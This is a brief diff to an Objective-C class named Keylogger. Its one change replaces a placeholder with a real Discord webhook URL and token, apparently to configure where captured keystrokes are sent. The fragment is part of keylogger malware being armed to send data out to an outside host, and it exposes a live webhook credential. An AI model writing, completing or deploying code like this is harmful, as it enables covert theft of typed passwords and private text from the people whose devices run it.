@@ -12,7 +12,7 @@
 
 @implementation Keylogger
 
-static NSString *webhookURL = @"YOUR_DISCORD_WEBHOOK_URL";
+static NSString *webhookURL = @"https://discord.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";
 
 + (instancetype)sharedInstance {
     static Keylogger *instance = nil;
